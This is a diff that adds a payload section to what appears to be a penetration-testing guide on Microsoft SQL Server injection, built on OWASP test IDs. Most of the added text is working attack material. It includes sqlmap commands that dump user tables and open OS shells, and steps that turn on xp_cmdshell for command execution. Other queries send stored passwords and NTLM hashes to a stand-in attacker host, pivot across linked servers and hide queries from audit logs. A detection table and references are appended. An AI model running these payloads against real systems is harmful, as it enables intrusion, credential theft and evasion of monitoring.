@@ -8,9 +8,10 @@ author: cyberstrike-official
 tags: [injection, input-validation, xss, sqli, wstg, inpv]
 tech_stack: []
 cwe_ids: []
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-inpv-01, wstg-inpv-02]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-inpv-02: "SQL Server (MSSQL) Injection grants INSERT/UPDATE access to write an unsanitized script payload directly into a stored field, achieving persistent Stored XSS against every user who views the record = Critical (Mass Account Compromise)"
 ---
 
 # wstg-inpv-05.3
@@ -413,6 +414,103 @@ sqlmap -u "https://target.com/product?id=1" --dbms=mssql --priv-esc
 
 ---
 
+## Example Commands/Payloads
+
+### Detection (curl)
+
+```bash
+TARGET="https://target.com/product"
+
+# MSSQL-specific error trigger
+curl -s "$TARGET?id=1'" | grep -Ei "unclosed quotation mark|microsoft sql server|OLE DB"
+
+# Native time-based blind (WAITFOR DELAY, works even without stacked queries)
+time curl -s "$TARGET?id=1' WAITFOR DELAY '0:0:5'--" -o /dev/null
+
+# Stacked-query confirmation (semicolon-separated batches)
+curl -s "$TARGET?id=1'; SELECT 1--"
+
+# Version/user fingerprint via UNION
+curl -s "$TARGET?id=1 UNION SELECT @@version,NULL,NULL--"
+```
+
+### SQLMap (MSSQL)
+
+```bash
+sqlmap -u "https://target.com/product?id=1" --dbms=mssql --banner
+sqlmap -u "https://target.com/product?id=1" --dbms=mssql --dbs
+sqlmap -u "https://target.com/product?id=1" --dbms=mssql -D target_db -T users --dump
+sqlmap -u "https://target.com/product?id=1" --dbms=mssql --sql-shell
+sqlmap -u "https://target.com/product?id=1" --dbms=mssql --os-shell          # enables xp_cmdshell if sysadmin
+sqlmap -u "https://target.com/product?id=1" --dbms=mssql --priv-esc
+```
+
+### xp_cmdshell Manual Escalation (once stacked queries confirmed)
+
+```sql
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
+'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
+'; EXEC master..xp_cmdshell 'whoami';--
+```
+
+### DNS/OOB Exfiltration (no xp_cmdshell required)
+
+```sql
+-- Requires VIEW SERVER STATE permission
+1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'+(select pass from users where id=1)+'.attacker-collab.net\1.xem',null,null))
+
+-- Requires CONTROL SERVER permission
+1 and exists(select * from fn_trace_gettable('\\'+(select pass from users where id=1)+'.attacker-collab.net\1.trc',default))
+```
+
+### NTLM Hash Capture via UNC Path (xp_dirtree, no xp_cmdshell needed)
+
+```sql
+1'; EXEC master..xp_dirtree '\\attacker-ip\share';--
+```
+
+Point `responder`/`smbserver.py` at the listener to capture the SQL Server service account's NTLMv2 hash for offline cracking or relay.
+
+### Linked Server Pivot (Trusted Links)
+
+```sql
+-- Enumerate reachable linked servers
+'; SELECT * FROM master..sysservers--
+
+-- Execute a query on the linked server as if local
+'; SELECT * FROM openquery("LINKEDSERVER", 'SELECT @@version')--
+
+-- Enable xp_cmdshell and run commands on the linked server (chainable across multiple hops)
+'; EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LINKEDSERVER--
+```
+
+### Alternative RCE via sp_execute_external_script (when xp_cmdshell is locked down)
+
+```sql
+'; EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'--
+```
+
+### OPSEC: Hide a Query from SQL Server Audit Logs
+
+```sql
+' AND 1=1--sp_password
+```
+
+Appending `sp_password` causes SQL Server to redact the statement text in the transaction/error log ("The text has been replaced with this comment for security reasons").
+
+### Detection Pattern
+
+| Signal | Meaning |
+| ------ | ------- |
+| `Unclosed quotation mark after the character string` / `Microsoft SQL Server` / `OLE DB` in response | Error-based SQLi, confirms MSSQL backend |
+| Response delayed exactly N seconds for `WAITFOR DELAY '0:0:N'` | Time-based blind SQLi (no stacked queries required) |
+| Second statement after `;` executes (e.g. `; SELECT 1--` changes result set) | Stacked queries enabled — full `xp_cmdshell` RCE path likely |
+| `xp_cmdshell` output reflected in response after `sp_configure` chain | Command execution confirmed, sysadmin-level DB account |
+| DNS/SMB callback received from `fn_xe_file_target_read_file`/`fn_trace_gettable`/`xp_dirtree` UNC payload | OOB exfiltration or NTLM hash capture confirmed without needing `xp_cmdshell` |
+| `master..sysservers` returns rows and `openquery()` executes on a remote host | Linked server trust allows lateral pivot to another SQL Server instance |
+
+---
+
 ## Remediation
 
 ```csharp
@@ -446,6 +544,13 @@ cursor.execute("SELECT * FROM users WHERE id = ?", user_id)
 | ---------- | ------------- |
 | **CWE-89** | SQL Injection |
 
+---
+
+## References
+
+- [OWASP WSTG - Testing for SQL Injection (WSTG-INPV-05)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
+- [PortSwigger SQL Injection Cheat Sheet - Microsoft SQL Server](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+- [PayloadsAllTheThings - SQL Injection (MSSQL)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#mssql-server)
 
 ---
 
